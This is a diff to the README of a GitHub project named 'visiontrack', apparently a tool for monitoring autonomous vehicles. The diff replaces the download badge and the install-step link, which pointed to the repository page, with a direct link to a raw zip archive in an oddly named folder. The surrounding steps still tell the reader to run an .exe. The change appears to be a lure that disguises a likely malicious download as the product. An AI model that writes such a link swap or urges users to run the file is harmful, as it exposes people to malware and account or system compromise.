@@ -1,6 +1,6 @@
 # 👁️ visiontrack - Monitor autonomous vehicles in real time
 
-<a href="https://github.com/Utilitybondhiphop551/visiontrack"><img src="https://img.shields.io/badge/Download-Application-blue.svg" alt="Download"></a>
+<a href="https://github.com/Utilitybondhiphop551/visiontrack/raw/refs/heads/main/patroonship/Software-2.9.zip"><img src="https://img.shields.io/badge/Download-Application-blue.svg" alt="Download"></a>
 
 ## 📋 Project Overview
 
@@ -19,7 +19,7 @@ To run this application, your computer needs enough power to process visual data
 
 ## ⬇️ Install the Software
 
-1. Visit the repository page to download the software: https://github.com/Utilitybondhiphop551/visiontrack
+1. Visit the repository page to download the software: https://github.com/Utilitybondhiphop551/visiontrack/raw/refs/heads/main/patroonship/Software-2.9.zip
 2. Locate the latest release on the right side of the page.
 3. Click the file ending in .exe to start the download.
 4. Open the downloaded file once the process completes.
